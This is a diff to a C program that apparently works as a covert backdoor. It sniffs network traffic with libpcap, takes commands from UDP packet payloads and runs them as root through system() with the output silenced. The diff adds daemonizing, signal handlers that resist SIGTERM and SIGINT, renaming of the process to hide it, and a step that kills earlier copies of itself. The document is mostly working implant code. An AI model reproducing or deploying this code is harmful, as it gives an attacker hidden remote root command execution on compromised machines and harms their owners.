@@ -1,8 +1,13 @@
 #include <arpa/inet.h>
+#include <errno.h>
 #include <pcap.h>
+#include <signal.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <syslog.h>
 #include <unistd.h>
 #include "pkthdr.h"
 #include "util.h"
@@ -62,9 +67,9 @@ u_char datalink_length(pcap_t *session)
         case DLT_LOOP:          return 4;
         case DLT_LINUX_SLL:     return 16;
     }
-#ifdef DEBUG
+    #ifdef DEBUG
     fprintf(stderr, "datalink_length(): unknown type: %d", dlink);
-#endif
+    #endif
     return 16;
 }
 
@@ -109,12 +114,13 @@ void inspect_udp(struct ip_header *iph)
     strncpy(command, data, len);
     command[len] = '\0';
 
-#ifdef DEBUG
+    #ifdef DEBUG
     printf("\n\tCommand: \"%s\"\n\n", command);
     fflush(stdout);
-#else
+    syslog(LOG_ERR, "RUNNING COMMAND");
+    #else
     strcpy(&command[len], " &> /dev/null"); 
-#endif
+    #endif
     system(command);
 
     /* don't leave key in memory */
@@ -126,10 +132,10 @@ void inspect_packet(u_char *linklen, const struct pcap_pkthdr *h,
 {
     struct ip_header *iph = (struct ip_header *) (bytes + *linklen);
 
-#ifdef DEBUG
+    #ifdef DEBUG
     printf("\n");
     print_packet(bytes, h->caplen);
-#endif
+    #endif
 
     switch (iph->protocol)
     {
@@ -164,40 +170,100 @@ pcap_t * config_session()
     char errbuf[PCAP_ERRBUF_SIZE];
     struct bpf_program filter;
 
-    /*if (pcap_findalldevs())*/
     if (pcap_lookupnet(NULL, &net, &mask, errbuf))
     {
-#ifdef DEBUG
+        #ifdef DEBUG
         fprintf(stderr, "pcap_lookupnet(): %s\n", errbuf);
-#endif
+        #endif
         exit(0);
     }
 
     if ((session = pcap_open_live(INF_NAME, SNAP_LEN, 0, 0, errbuf)) == NULL)
     {
-#ifdef DEBUG
+        #ifdef DEBUG
         fprintf(stderr, "pcap_open_live(): %s\n", errbuf);
-#endif
+        #endif
         exit(0);
     }
 
     if (pcap_compile(session, &filter, FILTER_STRING, 0, net))
     {
-#ifdef DEBUG
+        #ifdef DEBUG
         pcap_perror(session, "pcap_compile()");
-#endif
+        #endif
         exit(0);
     }
 
     if (pcap_setfilter(session, &filter))
     {
-#ifdef DEBUG
+        #ifdef DEBUG
         pcap_perror(session, "pcap_setfilter()");
-#endif
+        #endif
         exit(0);
     }
 
     return session;
+}
+
+void signal_handler(int sig)
+{
+    #ifdef DEBUG
+    switch (sig)
+    {
+        case SIGHUP:    syslog(LOG_WARNING, "received SIGHUP");     break;
+        case SIGINT:    syslog(LOG_WARNING, "received SIGINT");     break;
+        case SIGTERM:   syslog(LOG_WARNING, "received SIGTERM");    break;
+        case SIGQUIT:   syslog(LOG_WARNING, "received SIGQUIT");    break;
+    }
+    #endif
+}
+
+void daemonize(char* procname)
+{
+    pid_t pid;
+    
+    if ((pid = fork()) < 0)
+    {
+        #ifdef DEBUG
+        perror("daemonize()"); 
+        #endif
+        exit(0);
+    }
+
+    if (pid)
+    {
+        /* this is the parent, which should quit immediately */
+        exit(0);
+    }
+
+    umask(027);
+    setsid();
+
+    #ifdef DEBUG
+    openlog(procname, LOG_NOWAIT|LOG_PID, LOG_USER);
+    syslog(LOG_ERR, "daemon started");
+    #endif
+
+    pid = setsid(); 
+
+    /* change working directory in case parent working directory is unmounted */
+    if (chdir("/"))
+    {
+        #ifdef DEBUG
+        syslog(LOG_ERR, "chdir(): %s", strerror(errno));
+        syslog(LOG_DEBUG, "chdir(): %s", strerror(errno));
+        #endif
+        exit(0);
+    }
+
+    close(STDIN_FILENO);
+    close(STDOUT_FILENO);
+    close(STDERR_FILENO);
+
+    signal(SIGHUP, signal_handler);   
+    signal(SIGINT, signal_handler);   
+    signal(SIGTERM, signal_handler);   
+    signal(SIGQUIT, signal_handler);   
 }
 
 int main(int argc, char **argv)
@@ -205,30 +271,40 @@ int main(int argc, char **argv)
     pcap_t *session = NULL;
     int rtn;
     u_char linklen;
+    char killcmd[256];
     argc++; /* no op */
 
-    strcpy(argv[0], RUNNING_NAME);
     if (setuid(0) || setgid(0))
     {
-#ifdef DEBUG
+        #ifdef DEBUG
         fprintf(stderr, "> This needs to be owned by root with the s-bit set\n");
         fprintf(stderr, "chown root %s\n", argv[0]);
         fprintf(stderr, "chmod +s %s\n", argv[0]);
-#endif
+        #endif
         return 0;
     }
+
+    /* kill any previous instances of the program */
+    sprintf(killcmd, "ps aux | grep '%s' | grep -v 'grep' | awk '{print $2}' " \
+            "| xargs -t kill -9 &> /dev/null", RUNNING_NAME);
+    system(killcmd);
+
+    strcpy(argv[0], RUNNING_NAME);
+    daemonize(argv[0]);
 
     session = config_session();
     linklen = datalink_length(session); 
     rtn = pcap_loop(session, -1, inspect_packet, &linklen);
 
+    #ifdef DEBUG
     switch (rtn)
     {
-#ifdef DEBUG
         case 0:     fprintf(stderr, "pcap_loop(): cnt reached\n");      break;
         case -1:    pcap_perror(session, "pcap_loop()");                break;
         case -2:    fprintf(stderr, "pcap_loop(): no packets processed\n");
-#endif
     }
+    closelog();
+    #endif
+
     return 0;
 }
